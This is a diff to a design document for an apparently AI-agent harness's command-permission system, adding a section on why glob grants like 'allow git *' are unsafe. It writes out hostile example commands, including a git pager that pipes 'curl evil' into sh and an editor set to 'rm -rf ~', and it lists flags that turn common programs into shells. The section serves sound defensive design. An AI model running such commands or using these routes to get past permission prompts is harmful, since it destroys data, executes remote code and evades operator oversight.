@@ -363,7 +363,7 @@ prerequisite **refuses by name, saying what is missing and how to attach it** �
 silent downgrade to a weaker point, which is `docs/tool-design-brief.md` §3b's
 degrade-to-absence rule applied to configuration.
 
-| point | requires | on this box, 2026-09-10 |
+| point | requires | on this box, measured 2026-09-10 12:xx — **re-check when D25 lands** |
 |---|---|---|
 | **read-only** | — | satisfied |
 | **always-ask** | a *reachable* adjudicator | **blocked: D25** — the console adjudicator reads the daemon's stdin and a head cannot answer |
@@ -397,6 +397,73 @@ policy.
 `Inexpressible` is ungrantable everywhere, **including automode** — §3's flow rule is not
 a setting. Changing point mid-session works and states its cost first: seating write where
 there was none re-prefills, because `tools_json` is stable-prefix bytes.
+
+## 4f. `allow git * always` — the feature everyone ships and gets wrong
+
+Operator: *"on always ask — harnesses try to do globbing, you know `allow git * always`."*
+
+The want is legitimate: **stop asking me about git.** The mechanism every harness reaches
+for is a glob on the command text, and that is the GuardFall bug — a decision made on a
+string the shell will reinterpret.
+
+`git` is close to the worst possible example, because it has a dozen documented paths to
+arbitrary code:
+
+```
+git -c core.pager='sh -c "curl evil|sh"' log
+git -c core.editor='rm -rf ~' commit
+git clone <repo with hooks>
+git … --upload-pack='…'
+```
+
+Every one matches `git *`. **So `allow git *` is approximately `allow everything`** — the
+same defect as opencode's `always: ["*"]`, where one Always click silently disables config
+denies including their own `.env` guard (`docs/tool-survey.md` §1.1).
+
+### The grantable unit is an intent, not a word
+
+We can do this properly because layer A exists. `crates/code::shell::normalise` yields
+`Stage { program, argv, assignments, redirects, context, certainty }` and `ActionClass
+{ access, scope, reversibility, cost }` is already what tiers key on.
+
+So a grant is **`(program, ActionClass)`, checked per call against the normalisation.**
+`git status` and `git -c core.pager=… log` normalise to different classes: the first is
+covered, the second falls out and asks. **The grant never has to enumerate the escape
+hatches — it only has to key on something the escape hatches change.**
+
+### Which requires a table the normaliser deliberately does not have
+
+Its own header: *"It does not out-parse the shell, and it holds **no table of programs**."*
+That is correct — a grammar cannot know `-c core.pager` is an execution vehicle. So that
+knowledge is a **separate, small, named table** of **execution vehicles**: programs whose
+flags turn them into a shell.
+
+```
+git    -c core.pager= / core.editor=, --upload-pack, --receive-pack, ext:: remotes, clone hooks
+find   -exec, -execdir, -ok
+ssh    ProxyCommand, LocalCommand, -o
+rsync  -e, --rsh
+tar    --to-command, --use-compress-program
+awk perl sed        -e and friends
+env xargs nice timeout sudo    they run whatever follows
+```
+
+**A program absent from the table is not safe by omission.** It is either
+unknown-and-ungrantable, or declared inert *with a reason*. Absence must never read as
+permission — that is grok-build's catch-all `_ => Read(None)` (survey §1.4), which
+auto-approves `SchedulerCreate` and `Workflow` as if read-only. And the table carries a
+reason per entry for the same cause `ALWAYS_ASK` does: a list without reasons gets emptied.
+
+### What follows
+
+- `allow <program> in this project` grants `(program, ActionClass)`, never a text match.
+- A grant **cannot cover a class it was not granted for.** Granting `git status` does not
+  grant `git -c …`.
+- **An unresolvable normalisation is never covered by a grant.** It is already `NotRun`;
+  a grant must not be able to rescue it.
+- The grant states **what it covers in class terms** when offered, so the operator sees
+  what they are agreeing to: *"git — reads and writes inside the project, NOT code
+  execution."*
 
 ## 5. Open
 
